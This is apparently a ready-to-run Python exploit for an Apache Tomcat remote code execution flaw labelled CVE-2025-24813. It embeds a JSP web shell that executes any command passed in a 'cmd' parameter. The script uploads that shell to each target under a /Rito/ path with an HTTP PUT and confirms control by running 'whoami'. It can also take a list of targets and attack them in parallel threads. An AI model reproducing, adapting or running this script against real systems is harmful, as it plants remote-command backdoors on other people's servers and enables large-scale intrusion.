#!/usr/bin/env python3
import argparse
import requests
from concurrent.futures import ThreadPoolExecutor

COLOR = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "BLUE": "\033[94m",
    "PURPLE": "\033[95m",
    "CYAN": "\033[96m",
    "RESET": "\033[0m"
}

BANNER = f"""
{COLOR['PURPLE']}
  ___  _ __   ___ | |_ ___  ___| |_ 
 / _ \| '_ \ / _ \| __/ _ \/ __| __|
| (_) | |_) | (_) | ||  __/\__ \ |_ 
 \___/| .__/ \___/ \__\___||___/\__|
      |_| {COLOR['CYAN']}Apache Tomcat RCE Exploit
{COLOR['RED']}Modified for /Rito/ endpoint {COLOR['RESET']}@Target: CVE-2025-24813
"""

JSP_SHELL = """<%@page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while (disr != null) {
        out.println(disr); 
        disr = dis.readLine();
    }
}
%>"""


def print_success(target, shell_url):
    print(f"\n{COLOR['RED']}[!] Successfully exploited: {target}")
    print(f"[+] Webshell URL: {shell_url}")
    print(f"[+] Test command: {shell_url}?cmd=whoami{COLOR['RESET']}\n")


def check_target(target):
    try:
        if '://' not in target:
            target = f"http://{target}"

        base_url = target.rstrip('/')
        shell_name = "exploit.jsp"
        shell_url = f"{base_url}/Rito/{shell_name}"

        # Step 1: Upload JSP shell
        put_response = requests.put(
            shell_url,
            headers={
                "Content-Type": "application/x-java-jsp-file",
                "Accept": "*/*"
            },
            data=JSP_SHELL,
            timeout=15,
            verify=False
        )

        # Step 2: Verify upload
        if put_response.status_code in [200, 201, 204]:
            print(f"{COLOR['GREEN']}[+] Shell uploaded (HTTP {put_response.status_code}){COLOR['RESET']}")

            # Step 3: Test RCE
            test_cmd = "whoami"
            test_url = f"{shell_url}?cmd={test_cmd}"
            try:
                test_resp = requests.get(test_url, timeout=10)

                if test_resp.status_code == 200 and len(test_resp.text.strip()) > 0:
                    print_success(target, shell_url)
                    print(f"{COLOR['BLUE']}[+] Command output ({test_cmd}):{COLOR['RESET']}")
                    print(test_resp.text)
                    return True
                else:
                    print(
                        f"{COLOR['YELLOW']}[!] Shell uploaded but no command output (HTTP {test_resp.status_code}){COLOR['RESET']}")
                    print(f"[*] Try accessing manually: {shell_url}?cmd=id")
                    return False

            except Exception as e:
                print(f"{COLOR['YELLOW']}[!] Error testing shell: {str(e)}{COLOR['RESET']}")
                return False

        else:
            print(f"{COLOR['YELLOW']}[!] Upload failed (HTTP {put_response.status_code}){COLOR['RESET']}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"{COLOR['RED']}[!] Connection error: {str(e)}{COLOR['RESET']}")
        return False
    except Exception as e:
        print(f"{COLOR['RED']}[!] Unexpected error: {str(e)}{COLOR['RESET']}")
        return False


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description='Apache Tomcat RCE Exploit (CVE-2025-24813)')
    parser.add_argument('-u', '--url', help='Single target (http://host:port)')
    parser.add_argument('-l', '--list', help='File containing target list')
    parser.add_argument('-t', '--threads', type=int, default=3, help='Concurrent threads')
    args = parser.parse_args()

    targets = []
    if args.url:
        targets.append(args.url)
    elif args.list:
        try:
            with open(args.list, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{COLOR['RED']}[!] Error reading target file: {str(e)}{COLOR['RESET']}")
            return
    else:
        parser.print_help()
        return

    print(f"{COLOR['CYAN']}[*] Starting exploitation against {len(targets)} target(s){COLOR['RESET']}")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        results = list(executor.map(check_target, targets))

    success_count = sum(1 for result in results if result)
    print(f"\n{COLOR['PURPLE']}[*] Exploitation complete: {success_count}/{len(targets)} successful{COLOR['RESET']}")


if __name__ == "__main__":
    main()